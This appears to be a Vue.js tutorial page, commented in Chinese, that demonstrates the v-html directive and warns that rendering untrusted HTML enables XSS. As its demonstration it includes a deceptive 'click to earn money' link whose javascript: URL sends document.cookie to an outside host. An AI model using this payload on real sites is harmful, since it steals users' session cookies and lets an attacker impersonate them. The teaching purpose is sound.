<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <title>2.v-html</title>
    <script src="../js/vue.js"></script>
</head>

<body>
    <!--
        学过：
        v-bind  ：单向绑定解析表达式，简写为 :xxx
        v-model ：双向绑定
        v-on    ：绑定事件监听，简写为 @xxx
        v-for   ：遍历数组/对象/字符串
        v-if    ：条件渲染（动态控制节点是否存在）
        v-if-else：条件渲染（动态控制节点是否存在）
        v-else  ：条件渲染（动态控制节点是否存在）
        v-show  ：条件渲染（动态控制节点是否展示，代码一直存在）

        v-html指令：
            1.作用：向指定节点中渲染包含html结构的内容
            2.与插值语法区别：
                （1）v-html也替换节点内所有内容
                （2）v-html可识别html结构（v-text则不解析；Vue的插值语法也不解析）
            3.严重警告：v-html可能有安全隐患！
                （1）在网站上动态渲染任意HTML非常危险，容易遭到XSS攻击（冒名用户）
                （2）一定在可信的内容上使用v-html（非账号密码），永远不要用在用户提交的内容上！
    
    -->
    <div id="root">
        <div>你好，{{name}}</div>
        <div v-text="name"></div>
        <div v-html="str"></div>
        <div v-html="html"></div>
    </div>
    <script>
        Vue.config.productionTip = false; //阻止 vue 在启动时生成生产提示

        const vm = new Vue({
            el: '#root',
            data: {
                name: '硅谷', //光标出现的第一个位置
                str: '<h1>你好，{{name}}</h1>',
                html: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>点链接就赚</a>'
            },
        });
    </script>
</body>

</html>
